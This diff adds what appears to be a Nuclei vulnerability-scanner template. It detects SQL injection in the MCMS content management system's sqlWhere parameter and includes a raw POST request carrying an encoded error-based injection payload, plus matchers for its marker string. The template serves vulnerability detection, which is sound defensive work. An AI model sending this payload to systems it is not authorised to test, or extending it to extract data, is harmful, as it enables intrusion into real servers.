@@ -1,0 +1,27 @@
+id: mcms-sqlwhere-sqli
+info:
+  name: MCMS list Interface sqlWhere SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    MCMS is a lightweight open-source content management system developed in Java. Versions before 5.2.10 are vulnerable to SQL injection via the `sqlWhere` parameter of the `/cms/category/list` endpoint. Successful exploitation could lead to sensitive information disclosure and potential server compromise.
+  tags: sql-injection
+  reference:
+    - https://gitee.com/mingSoft/MCMS
+http:
+  - raw:
+      - |
+        POST /cms/category/list HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        sqlWhere=%5B%7B%22action%22%3A%22%22%2C%22field%22%3A%221%20AND%20EXTRACTVALUE(4095%2CCONCAT(0x5c%2C0x717a6a6271%2C(SELECT%20(ELT(4095%3D4095%2C1)))%2C0x716b6a7871))%22%2C%22el%22%3A%22eq%22%2C%22model%22%3A%22contentTitle%22%2C%22name%22%3A%22%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98%22%2C%22type%22%3A%22input%22%2C%22value%22%3A%22a%22%7D%5D
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "qzjbq1qkjxq"
